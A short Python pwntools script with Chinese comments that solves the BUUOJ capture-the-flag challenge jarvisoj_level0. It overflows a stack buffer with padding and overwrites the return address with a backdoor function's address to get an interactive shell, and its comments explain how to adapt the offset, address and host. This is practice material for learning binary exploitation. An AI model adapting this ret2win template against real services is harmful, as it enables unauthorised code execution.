from pwn import *  #导入pwntools包,运行pip install pwntools安装
context(log_level='debug',arch='amd64',os='linux')
#先用file 命令判断是32还是64位

# 漏洞位置  scanf  read  gets
#远程
ip = "node5.buuoj.cn" #修改ip,  127.0.0.1
prot = 25422          #修改端口
io=remote(ip,prot) 
back_door=0x400596   # 修改后门函数地址
offest = 0x80        #修改偏移
payload=b'a'*offest + b'a'* 8 +p64(back_door) #拼接payload 不需要改
io.sendline(payload) #发送数据，不需要改
io.interactive()     #建立连接，不需要改

"""
https://buuoj.cn/challenges#jarvisoj_level0 题目
"""